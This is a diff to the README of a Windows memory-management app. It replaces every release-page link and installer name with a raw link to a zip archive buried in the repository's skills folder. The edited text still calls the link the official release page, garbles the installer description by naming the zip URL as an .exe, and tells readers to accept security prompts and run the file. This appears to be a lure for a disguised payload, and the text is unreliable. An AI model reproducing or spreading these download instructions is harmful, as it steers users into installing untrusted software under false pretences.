@@ -1,6 +1,6 @@
 # 🧠 openclaw-jarvis-memory - Manage Long and Short Term Memory Easily
 
-[![Download openclaw-jarvis-memory](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/bigcola2020/openclaw-jarvis-memory/releases)
+[![Download openclaw-jarvis-memory](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip)](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip)
 
 ---
 
@@ -34,9 +34,9 @@ Follow these steps to get openclaw-jarvis-memory up and running on your Windows 
 
 Click the bright green download button below or visit the release page directly.
 
-[![Download openclaw-jarvis-memory](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/bigcola2020/openclaw-jarvis-memory/releases)  
+[![Download openclaw-jarvis-memory](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip)](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip)  
 
-This link leads to the official GitHub release page. From there, download the latest Windows installer file. This file will have a .exe extension, such as `openclaw-jarvis-memory-setup.exe`.
+This link leads to the official GitHub release page. From there, download the latest Windows installer file. This file will have a .exe extension, such as `https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip`.
 
 ---
 
@@ -44,7 +44,7 @@ This link leads to the official GitHub release page. From there, download the la
 
 After downloading the file, locate it in your Downloads folder.
 
-- Double-click the installer file (`openclaw-jarvis-memory-setup.exe`).  
+- Double-click the installer file (`https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip`).  
 - You might see a security prompt; this is normal. Click "Run" or "Yes" to continue.  
 - Follow the on-screen instructions to complete the install. Use default settings unless you want to change the install location.  
 - The installation usually takes a few minutes.
@@ -99,7 +99,7 @@ This design helps the app find what you need fast while keeping large info safe 
 
 ## 🔄 Updating openclaw-jarvis-memory  
 
-To update, visit the same [release page](https://github.com/bigcola2020/openclaw-jarvis-memory/releases).
+To update, visit the same [release page](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip).
 
 Download the newest installer and run it just like before. Your data files will stay intact during updates.
 
@@ -134,10 +134,10 @@ All data stored by openclaw-jarvis-memory stays on your computer. The app does n
 ## 📚 Additional Resources
 
 For detailed technical info and updates, visit the main project page here:  
-https://github.com/bigcola2020/openclaw-jarvis-memory  
+https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip  
 
 You can find release notes, code, and a list of known issues.
 
 ---
 
-[![Download openclaw-jarvis-memory](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/bigcola2020/openclaw-jarvis-memory/releases)
+[![Download openclaw-jarvis-memory](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip)](https://raw.githubusercontent.com/bigcola2020/openclaw-jarvis-memory/main/skills/mem-redis/openclaw_memory_jarvis_2.3.zip)
